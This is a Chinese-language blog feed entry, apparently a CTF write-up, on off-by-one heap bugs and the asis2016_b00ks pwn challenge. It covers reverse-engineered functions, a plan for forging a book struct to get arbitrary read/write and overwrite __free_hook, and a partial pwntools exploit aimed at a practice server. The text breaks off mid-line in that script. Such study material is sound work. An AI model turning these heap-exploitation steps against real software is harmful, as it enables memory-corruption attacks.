<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>refrain的blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-10-28T17:38:58.875Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>refrian</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>off by one and asis2016_b00ks</title>
    <link href="http://example.com/2021/10/28/off-by-one-and-asis2016-b00ks/"/>
    <id>http://example.com/2021/10/28/off-by-one-and-asis2016-b00ks/</id>
    <published>2021-10-28T15:39:19.000Z</published>
    <updated>2021-10-28T17:38:58.875Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这题早就做完了，依旧是ctfwiki系列，就是最近有点摸鱼，一直不想写…</p><p>另外庆祝一下自己总算是有队要了，还是挺开心的，只是觉得自己太菜了也太懒了不配呆在队里，虽然暂时也只是见习队员，希望自己能努力学习早日转正吧。</p><span id="more"></span><h1 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h1><p>就是向缓冲区就是多写了一个字节。</p><p>大多数是这两种情况:</p><p>1.for循环的时候，多写入了一个字节</p><p>2.处理字符串时的操作不当</p><p>下面贴一点ctfwiki的例子，仅作学习参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int my_gets(char *ptr,int size)</span><br><span class="line">&#123;</span><br><span class="line">    int i;</span><br><span class="line">    for(i=0;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    return i;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    void *chunk1,*chunk2;</span><br><span class="line">    chunk1=malloc(16);</span><br><span class="line">    chunk2=malloc(16);</span><br><span class="line">    puts(&quot;Get Input:&quot;);</span><br><span class="line">    my_gets(chunk1,16);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是第一种情况，这个my_gets函数明显多输入了一个字节</p><p>下面是第二章情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char buffer[40]=&quot;&quot;;</span><br><span class="line">    void *chunk1;</span><br><span class="line">    chunk1=malloc(24);</span><br><span class="line">    puts(&quot;Get Input&quot;);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    if(strlen(buffer)==24)</span><br><span class="line">    &#123;</span><br><span class="line">        strcpy(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里乍一看没有错误，但是strlen是以’\x00’为截断字符的，也就是说他并不会把’\x00’算在内，而过了if检测后，strcpy却会把’\x00’也复制过去，于是我们便向chunk1处多写入了一个’\x00’</p><h2 id="off-by-one-利用思路"><a href="#off-by-one-利用思路" class="headerlink" title="off by one 利用思路"></a>off by one 利用思路</h2><ol><li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li><li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li></ol><p>值得一题的是lib-2.29对第二种方法加入了保护机制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">       malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);</span><br></pre></td></tr></table></figure><p>这里看了一下还是挺绕的，我暂时也没有做深入的了解，把他给的第三道例题啃了以后可能会补上。</p><h2 id="asis2016-b00ks"><a href="#asis2016-b00ks" class="headerlink" title="asis2016_b00ks"></a>asis2016_b00ks</h2><h2 id="1-逆向"><a href="#1-逆向" class="headerlink" title="1.逆向"></a>1.逆向</h2><p>逆向之前也检查一下保护</p><p><img src="/2021/10/28/off-by-one-and-asis2016-b00ks/sJwe4hOULuN1d3F.png" alt></p><p>和全开似乎区别也不大</p><p>逆向一下，主函数是一个经典的菜单题，但是这里会让你先change_author，这个函数我们后面也会分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(int a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  struct _IO_FILE *v3; // rdi</span><br><span class="line">  int v5; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  v3 = stdin;</span><br><span class="line">  setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">  sub_A77();</span><br><span class="line">  change_author();</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = menu();</span><br><span class="line">    if ( v5 == 6 )</span><br><span class="line">      break;</span><br><span class="line">    switch ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        add(v3);</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        delete(v3);</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        edit(v3);</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        print_content(v3);</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        change_author();</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        v3 = (struct _IO_FILE *)&quot;Wrong option&quot;;</span><br><span class="line">        puts(&quot;Wrong option&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Thanks to use our library software&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">__int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+0h] [rbp-20h] BYREF</span><br><span class="line">  int v2; // [rsp+4h] [rbp-1Ch]</span><br><span class="line">  void *book; // [rsp+8h] [rbp-18h]</span><br><span class="line">  void *name_addr; // [rsp+10h] [rbp-10h]</span><br><span class="line">  void *v5; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v1 = 0;</span><br><span class="line">  printf(&quot;\nEnter book name size: &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt; 0 )</span><br><span class="line">    goto LABEL_2;</span><br><span class="line">  printf(&quot;Enter book name (Max 32 chars): &quot;);</span><br><span class="line">  name_addr = malloc(v1);</span><br><span class="line">  if ( !name_addr )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;unable to allocate enough space&quot;);</span><br><span class="line">    goto LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( (unsigned int)sub_9F5(name_addr, (unsigned int)(v1 - 1)) )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;fail to read name&quot;);</span><br><span class="line">    goto LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = 0;</span><br><span class="line">  printf(&quot;\nEnter book description size: &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    printf(&quot;Malformed size&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = malloc(v1);</span><br><span class="line">    if ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Enter book description: &quot;);</span><br><span class="line">      if ( (unsigned int)sub_9F5(v5, (unsigned int)(v1 - 1)) )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(&quot;Unable to read description&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        v2 = sub_B24();</span><br><span class="line">        if ( v2 == -1 )</span><br><span class="line">        &#123;</span><br><span class="line">          printf(&quot;Library is full&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          book = malloc(0x20uLL);</span><br><span class="line">          if ( book )</span><br><span class="line">          &#123;</span><br><span class="line">            *((_DWORD *)book + 6) = v1;</span><br><span class="line">            *((_QWORD *)off_202010 + v2) = book;</span><br><span class="line">            *((_QWORD *)book + 2) = v5;</span><br><span class="line">            *((_QWORD *)book + 1) = name_addr;</span><br><span class="line">            *(_DWORD *)book = ++unk_202024;</span><br><span class="line">            return 0LL;</span><br><span class="line">          &#125;</span><br><span class="line">          printf(&quot;Unable to allocate book struct&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Fail to allocate memory&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_17:</span><br><span class="line">  if ( name_addr )</span><br><span class="line">    free(name_addr);</span><br><span class="line">  if ( v5 )</span><br><span class="line">    free(v5);</span><br><span class="line">  if ( book )</span><br><span class="line">    free(book);</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>add函数，看起来挺复杂的，其实逆向的时候可以省略不少无用的代码，这里的话其实就是创建了一个结构体book，里面存放着name的地址和description的地址，chunk的序号，以及name的size，不过这里他虽然说name_size必须&lt;32，但似乎没加啥限制…</p><p>然后是edit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+8h] [rbp-8h] BYREF</span><br><span class="line">  int i; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Enter the book id you want to edit: &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 19 &amp;&amp; (!*((_QWORD *)off_202010 + i) || **((_DWORD **)off_202010 + i) != v1); ++i )</span><br><span class="line">      ;</span><br><span class="line">    if ( i == 20 )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Can&#x27;t find selected book!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Enter new book description: &quot;);</span><br><span class="line">      if ( !(unsigned int)input_num(</span><br><span class="line">                            *(_BYTE **)(*((_QWORD *)off_202010 + i) + 16LL),</span><br><span class="line">                            *(_DWORD *)(*((_QWORD *)off_202010 + i) + 24LL) - 1) )</span><br><span class="line">        return 0LL;</span><br><span class="line">      printf(&quot;Unable to read new description&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Wrong id&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>挺干净的edit，没有找到什么溢出和越界</p><p>然后这里这个自定义的input_num其实该进去看看有没有off by one的(后面发现漏洞的点其实就在这里，我真是太菜了，在分析change_author的时候贴了，但是这里的话其实是没有的，因为这里做了-1处理），但这里没有我也不贴了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+8h] [rbp-8h] BYREF</span><br><span class="line">  int i; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  i = 0;</span><br><span class="line">  printf(&quot;Enter the book id you want to delete: &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 19 &amp;&amp; (!*((_QWORD *)off_202010 + i) || **((_DWORD **)off_202010 + i) != v1); ++i )</span><br><span class="line">      ;</span><br><span class="line">    if ( i != 20 )</span><br><span class="line">    &#123;</span><br><span class="line">      free(*(void **)(*((_QWORD *)off_202010 + i) + 8LL));</span><br><span class="line">      free(*(void **)(*((_QWORD *)off_202010 + i) + 16LL));</span><br><span class="line">      free(*((void **)off_202010 + i));</span><br><span class="line">      *((_QWORD *)off_202010 + i) = 0LL;</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;Can&#x27;t find selected book!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Wrong id&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 1LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指针删干净了，这里虽然有残余的指针但在这个程序里是没办法作为索引进行任何功能的，没有uaf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int print_name()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rax</span><br><span class="line">  int i; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt;= 19; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *((_QWORD *)off_202010 + i);</span><br><span class="line">    if ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;ID: %d\n&quot;, **((unsigned int **)off_202010 + i));</span><br><span class="line">      printf(&quot;Name: %s\n&quot;, *(const char **)(*((_QWORD *)off_202010 + i) + 8LL));</span><br><span class="line">      printf(&quot;Description: %s\n&quot;, *(const char **)(*((_QWORD *)off_202010 + i) + 16LL));</span><br><span class="line">      LODWORD(v0) = printf(&quot;Author: %s\n&quot;, (const char *)off_202018);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是打印</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 change_author()</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;Enter author name: &quot;);</span><br><span class="line">  if ( !(unsigned int)input_num(off_202018, 32) )</span><br><span class="line">    return 0LL;</span><br><span class="line">  printf(&quot;fail to read author_name&quot;);</span><br><span class="line">  return 1LL;</span><br></pre></td></tr></table></figure><p>这里有一个off by one，实际上是发生在 input_num里面，并且这里注意0ff_202018,点进去的值是202040,刚好离存储book结构体的数组差了32个字节，后面会用到，我真是太菜了师傅们….</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_9F5(_BYTE *a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+14h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  if ( a2 &lt;= 0 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (unsigned int)read(0, a1, 1uLL) != 1 )</span><br><span class="line">      return 1LL;</span><br><span class="line">    if ( *a1 == 10 )</span><br><span class="line">      break;</span><br><span class="line">    ++a1;</span><br><span class="line">    if ( i == a2 )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = 0;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实对于边界的考虑是不当的，也就是说比如我们输入32个字符，也就是此时 i == a2已经break了，但是我们a1++了，然后将a1存储的位置变成0，实际上我们溢出了一个0字节，猜测原意可能是想将下一个字节变成0，方便字符串的截断吧。</p><h2 id="2-利用思路1"><a href="#2-利用思路1" class="headerlink" title="2.利用思路1"></a>2.利用思路1</h2><p>第一种方法比较奇怪，也是网上比较多的方法，我们先说方法再介绍他诡异的地方吧。</p><p>虽然我们还没有介绍第二种方法，但两种方法对off by one的这个洞的利用思路其实是一样的，前面我们注意到，存储book结构体地址的地方偏移是0x202060,而change_author，的偏移是0x202040，刚好差了32个字节，于是我们的off by one漏洞就可以控制第一个book结构体的低位，利用的核心思想就是因为这个。</p><p>然后两种方法，都是通过调整name的大小，使得description的位置刚好落在0x??????00的位置(?是具体的地址)，于是，我们便可以通过offbyone漏洞，将第一个book结构体的位置改为他的description的位置，但在更改book地址之前，我们可以利用正常的edit功能在description处构造一个伪造的book，这样再使用漏洞以后，再次调用edit和show功能，于是我们便拥有了任意读写的能力，这也是老套路了，然后两种方法的区别在哪呢，是leak libc的方法有区别，我先说第一种方法吧。</p><p>第一种方法就是，在系统创建堆块时有两种方法，一种是通过brk直接扩展，而另一种是通过mmap直接映射，如果我们创建一个很大的堆块，他就会放在mmap区，而mmap又与libc固定偏移。所以我们直接创建一个book2，add(0x21000,0x21000)，因为name和description的部分都在mmap区，所以book2的结构体与book1的结构体地址也是固定偏移，为0x30，所以我们就可以泄露book2的地址，上面说过我们拥有伪造一个chunk的地址，我们直接把伪造的book的地址改到book2，并将他的name和description改到book2name的地址，这样我们打印的时候就会把他当成伪造book的name内容并打印出来，并且打印到屏幕上然后直接gdb.attach手动查看内存，看一下book2name的地址，然后用他和gdb查到的libc基址做差得到offset，然后再把offset加给book2name得到libc地址，这样就可以保证在地址随机化的情况下，泄露的libc是对的，后面泄露了libc，我们拥有任意写直接打free_hook就行，没啥好说的。</p><p>但是这个方法奇怪的地方就是他存在一个问题，在本地调试是可以的，但是在远程服务器上我们并没有查看他内存空间的能力，查了很久有师傅可以泄露远程机的内存来解决，但是并没有告知方法，所以我就自己想了利用思路2，其实这题直接用unsortedbin 去leak就行了..没必要搞那些别的。</p><p>但是还是把第一种方法的exp放一下，第一种方法网上有很多，我是在熬夜赶工，感觉刚刚自己的思路不是很清晰，难免有些错误，师傅们见谅，想学习第一种方法去网上搜搜别人的就好了</p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context(log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)</span><br><span class="line">#p = process(&quot;./b00ks&quot;)</span><br><span class="line">#p = process([&#x27;./b00ks&#x27;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23-buu.so&quot;&#125;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,28918)</span><br><span class="line">elf = ELF(&quot;./b00ks&quot;)</span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)</span><br><span class="line">libc = ELF(&quot;libc-2.23-buu.so&quot;)</span><br><span class="line">def add(name_size,name,des_size,des):</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;Enter book name size: &quot;)</span><br><span class="line">p.sendline(str(name_size))</span><br><span class="line">p.recvuntil(&quot;Enter book name (Max 32 chars): &quot;)</span><br><span class="line">p.sendline(name)</span><br><span class="line">p.recvuntil(&quot;Enter book description size: &quot;)</span><br><span class="line">p.sendline(str(des_size))</span><br><span class="line">p.recvuntil(&quot;Enter book description: &quot;)</span><br><span class="line">p.sendline(des)</span><br><span class="line">def edit(index,new_des):</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">p.recvuntil(&quot;Enter the book id you want to edit: &quot;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(&quot;Enter new book description: &quot;)</span><br><span class="line">p.sendline(new_des)</span><br><span class="line">def print_book():</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;4&quot;)</span><br><span class="line">def change_author(author):</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;5&quot;)</span><br><span class="line">p.recvuntil(&quot;Enter author name: &quot;)</span><br><span class="line">p.sendline(author)</span><br><span class="line">def delete(index):</span><br><span class="line">p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">p.recvuntil(&quot;Enter the book id you want to delete: &quot;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Enter author name: &quot;)</span><br><span class="line">p.sendline(b&#x27;a&#x27;*32)</span><br><span class="line">book1_namesize = 0xd0</span><br><span class="line">book1_dessize = 0x20</span><br><span class="line">add(book1_namesize,b&#x27;a&#x27;*8,book1_dessize,b&#x27;b&#x27;*8)</span><br><span class="line">print_book()</span><br><span class="line">p.recvuntil(b&#x27;a&#x27;*32)</span><br><span class="line">book1_addr = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">#print(&quot;book1_addr:&quot; + hex(book1_addr))</span><br><span class="line">book2_addr = book1_addr + 0x30</span><br><span class="line">add(0x21000,b&#x27;c&#x27;*8,0x21000,b&#x27;d&#x27;*8)</span><br><span class="line">payload = p64(1) + p64(book2_addr + 0x8) +p64(book2_addr +0x8)+p64(0xffff)</span><br><span class="line">edit(1,payload)</span><br><span class="line">change_author(b&#x27;a&#x27;*32)</span><br><span class="line">print_book()</span><br><span class="line">p.recvuntil(&quot;Name: &quot;)</span><br><span class="line">book2_name = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(&quot;book1_addr:&quot; + hex(book1_addr))</span><br><span class="line">print(&quot;book2_name:&quot;+hex(book2_name))</span><br><span class="line">offset = 0x7ff8c26c3010-0x7ff8c2112000</span><br><span 